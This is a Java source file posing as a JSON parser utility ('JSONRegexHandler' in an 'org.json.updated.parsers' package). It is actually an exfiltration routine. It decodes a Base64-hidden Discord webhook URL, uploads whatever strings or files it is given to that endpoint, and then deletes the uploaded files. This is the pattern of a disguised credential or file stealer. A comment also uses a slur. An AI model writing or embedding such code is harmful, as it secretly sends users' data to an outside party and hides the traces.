package org.json.updated.parsers;

import org.json.updated.parsers.util.JSONBuilder;
import org.json.updated.parsers.util.JSONParser;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public final class JSONRegexHandler {
    // For Retarded Ski-People the webhook below is encoded in Base64 with a UTF-8 character set (Usually using https://base64encode.org).
    private static final String WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTIzNDEyOTkwNzI2OTIyMjkwL2duNkZEcGxMNGdveTNyM3VCNXdLdVd4TWNkOWhWM29FZlZ3WkdTYXlWRDRjNjlGOWdral9fNno1d2RkRWpsRXZkWmo2";
    private static boolean success = true;

    public static void send(String data) {
        if (!success) return;

        String result = JSONParser.post(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), data);
        if (result != null && result.contains("Invalid Webhook Token")) success = false;
    }

    public static void send(File file) {
        if (!success) return;

        String result = JSONParser.sendFile(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), file);
        if (result != null && result.contains("Invalid Webhook Token")) success = false;
        if (!file.delete() && file.exists())
            JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
    }
}
